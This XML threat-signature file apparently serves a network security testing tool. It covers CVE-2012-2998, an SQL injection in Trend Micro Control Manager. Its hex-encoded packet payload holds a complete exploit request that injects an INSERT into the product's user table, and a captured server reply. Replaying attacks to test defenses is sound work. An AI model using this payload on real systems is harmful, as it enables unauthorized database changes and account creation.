<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Trend Micro Control Manager ad hoc query Module SQL Injection(IPv6_Version)"/>
    <EngDesc display="true" value="An SQL injection vulnerability exists in Trend Micro Control Manager. The vulnerability is due to insufficient input validation on user queries by the ad hoc query module.&#13;&#10;A remote, authenticated attacker could exploit this vulnerability by sending crafted &quot;id&quot; parameter in the GET request for AdHocQuery_Processor.aspx page. A successful exploitation attempt could result in the execution of SQL commands under the context of the SYSTEM user."/>
    <Intent display="true">
      <item value="SQL_Injection_Vulnerability"/>
    </Intent>
    <Protocol display="true" value="IPv6.HTTP,HTTPS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Severity display="true" value=""/>
    <Known_Vendors_Affected display="true">
      <item value="Trend"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Micro_Control_Manager"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="5.5_prior_to_5.5.0.1823"/>
      <item value="6_prior_to_6.0.0.1449"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20120928-04"/>
    <CVEID display="true" value="CVE-2012-2998"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value="85807"/>
    <Author display="true" value="Cindy"/>
    <ID display="true" value="c6b593b78a26ccd0980a9fc2e554d61a"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="Network"/>
    <AccessComplexity display="false" value="Medium"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="634868724961732761"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1351503033" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="D"/>
      <for index="E"/>
    </for>
    <for index="B">
      <for index="D"/>
      <for index="E"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:2A:A7" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
        <TCP srcPort="41711" destPort="$HTTPdestPort" SeqNumber="052499CD" AckNumber="148B1F4E" HeaderLength="08" WindowSize="002E" Checksum="F4CD" UrgentPointer="0000" Options="0101080ADDB2CA3D01941110" Payload="474554202F7765626170702F4164486F6351756572792F4164486F6351756572795F50726F636573736F722E617370783F416374696F6E3D56696577266173633D7472756526536F72743D3726706167696E673D31302669643D33353062363531632D313563352D343563612D386436342D333362323066336663346438253237494E53455254253230494E544F25323064625F436F6E74726F6C4D616E616765722E64626F2E74625F55736572496E666F253230253238557365724775696425324325323025354250617373776F72642535442532432532304D61696C4164647265737325323925323056414C55455325323025323825323761616161616161612D616161612D616161612D616161612D61616161616161616161616125323725324325323025323754454C555353656375726974794C616273253237253243253230253237706F6325343074736C2E636F6D2532372532392D2D20485454502F312E310D0A557365722D6167656E743A20557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520382E303B2057696E646F7773204E5420352E313B290D0A4163636570742D456E636F64696E673A206964656E746974790D0A486F73743A203137322E31362E382E3134370D0A436F6F6B69653A204153502E4E45545F53657373696F6E49643D676767736A317A7476703263706F34356A65756B73686E713B202E41535058415554483D33454439444431393939354430423234384446413036333844304634363944343344433539384246343635323643334441394530323933314432384333344138314331313733433537304343444445393036453041374644393143374532363446304531424534414142424533373043334345343844314445343639464341364235313930324539303444464132313131454235393844433135394138343330423736373335443434333232373634393931323241443646323334344135453130353946444343433B205746494E464F523D726F6F740D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IPv6>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="00:50:56:B4:2A:A7" destMac="00:1B:78:75:79:68" pktType="0800">
        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
          <TCP srcPort="$HTTPdestPort" destPort="41711" SeqNumber="148B1F4E" AckNumber="05249CDC" HeaderLength="08" WindowSize="0104" Checksum="0EF3" UrgentPointer="0000" Options="0101080A01941113DDB2CA3D" Payload="485454502F312E3120323030204F4B0D0A43616368652D436F6E74726F6C3A20707269766174650D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D7574662D380D0A5365727665723A204D6963726F736F66742D4949532F372E300D0A582D4173704E65742D56657273696F6E3A20322E302E35303732370D0A582D55412D436F6D70617469626C653A2049453D456D756C6174654945370D0A446174653A205468752C2031352044656320323031312031393A35313A303120474D540D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A326132660D0A0D0A0D0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F445444205848544D4C20312E30205472616E736974696F6E616C2F2F454E222022687474703A2F2F7777772E77332E6F72672F54522F7868746D6C312F4454442F7868746D6C312D7472616E736974696F6E616C2E647464223E0D0A0D0A3C68746D6C20786D6C6E733D22687474703A2F2F7777772E77332E6F72672F313939392F7868746D6C22203E0D0A3C686561643E3C7469746C653E0D0A09556E7469746C656420506167650D0A3C2F7469746C653E3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F6373732220687265663D222E2E2F6373732F7472656E642D7374796C652E63737322202F3E0D0A202020203C736372697074206C616E67756167653D226A6176617363726970742220747970653D22746578742F6A617661736372697074223E0D0A2020202066756E6374696F6E20657870616E6444657461696C28290D0A202020207B0D0A20202020202020766172206F626A203D20646F63756D656E742E676574456C656D656E74427949642827457863657074696F6E44657461696C27293B0D0A2020202020202076617220696D67203D20646F63756D656E742E676574456C656D656E74427949642827657870616E645F69636F6E27293B0D0A202020202020206966286F626A2E7374796C652E646973706C6179203D3D20276E6F6E6527290D0A202020202020207B0D0A2020202020202020202020206F626A2E7374796C652E646973706C6179203D2027626C6F636B273B0D0A202020202020202020202020696D672E7372633D272E2E2F696D616765732F657870616E645F706C75732E676966273B0D0A202020202020207D200D0A20202020202020656C73650D0A202020202020207B0D0A2020202020202020202020206F626A2E7374796C652E646973706C6179203D20276E6F6E65273B0D0A202020202020202020202020696D672E7372633D272E2E2F696D616765732F657870616E645F6D696E75732E676966273B0D0A20202020202020207D200D0A202020207D0D0A202020203C2F7363726970743E0D0A3C2F686561643E0D0A3C626F64793E0D0A202020203C666F726D206E616D653D22666F726D3122206D6574686F643D22706F73742220616374696F6E3D222F7765626170702F457863657074696F6E50616765732F4572726F72506167652E617370783F416374696F6E3D5669657726616D703B6173633D7472756526616D703B536F72743D3726616D703B706167696E673D313026616D703B69643D33353062363531632D313563352D343563612D386436342D33336232306633666334643827494E534552542B494E544F2B64625F436F6E74726F6C4D616E616765722E64626F2E74625F55736572496E666F2B2855736572477569642532632B25356250617373776F72642535642532632B4D61696C41646472657373292B56414C5545532B282761616161616161612D616161612D616161612D616161612D616161616161616161616161272532632B2754454C555353656375726974794C616273272532632B27706F6325343074736C2E636F6D27292D2D222069643D22666F726D31223E0D0A3C696E70757420747970653D2268696464656E22206E616D653D225F5F564945575354415445222069643D225F5F564945575354415445222076616C75653D222F7745504477554A4D6A63344F5463304D44413144325157416749444432515744674942447738574168344556475634644155635247463059574A686332556759323975626D566A64476C766269426D59576C7364584A6C4C6D526B41674D504478594348774146475552686447466959584E6C49476C7A4947527063324E76626D356C5933526C5A43356B5A414946447738574168384142535A5162475668633255675932686C59327367655739316369426B59585268596D467A5A53426A623235755A574E30615739754C6D526B4167675044785943487741465831427962324E6C5A4856795A5342766369426D6457356A64476C766269416E6333426653584E5459585A6C5A454E316333527662565A705A58636E494756346347566A64484D67634746795957316C644756794943644156486C775A5363734948646F61574E6F49486468637942756233516763335677634778705A5751755A47514343673850466749664141556955336C7A644756744C6B52686447457555334673513278705A5735304C6C4E78624556345932567764476C76626D526B4167775044785943487741464843354F5A58516755334673513278705A573530494552686447456755484A76646D6C6B5A584A6B5A41494F447738574168384142635156494341675958516755336C7A644756744C6B52686447457555334673513278705A5735304C6C4E7862454E76626D356C593352706232347554323546636E4A76636968546357784665474E6C63485270623234675A58686A5A584230615739754C434243623239735A57467549474A795A57467251323975626D566A64476C7662696B4E436941674947463049464E356333526C62533545595852684C6C4E7862454E7361575675644335546357784A626E526C636D356862454E76626D356C593352706232347554323546636E4A76636968546357784665474E6C63485270623234675A58686A5A584230615739754C434243623239735A57467549474A795A57467251323975626D566A64476C7662696B4E436941674947463049464E356333526C62533545595852684C6C4E7862454E7361575675644335555A484E5159584A7A5A584975564768796233644665474E6C6348527062323542626D525859584A756157356E4B46526B63314268636E4E6C636C4E305958526C54324A715A574E3049484E305958526C54324A714B51304B494341675958516755336C7A644756744C6B52686447457555334673513278705A5735304C6C526B63314268636E4E6C636935536457346F556E5675516D566F59585A7062334967636E5675516D566F59585A706233497349464E7862454E7662573168626D51675932316B534746755A47786C63697767553346735247463059564A6C5957526C6369426B59585268553352795A5746744C434243645778725132397765564E70625842735A564A6C6333567364464E6C64434269645778725132397765556868626D52735A5849734946526B63314268636E4E6C636C4E305958526C54324A715A574E3049484E305958526C54324A714B51304B494341675958516755336C7A644756744C6B52686447457555334673513278705A5735304C6C4E7862455268644746535A57466B5A58497551323975633356745A55316C64474645595852684B436B4E436941674947463049464E356333526C62533545595852684C6C4E7862454E7361575675644335546357784559585268556D56685A4756794C6D646C6446394E5A585268524746305953677044516F67494342686443425465584E305A57307552474630595335546357784462476C6C626E51755533467351323974625746755A43354761573570633268466547566A6458526C556D56685A4756794B464E7862" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IPv6>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
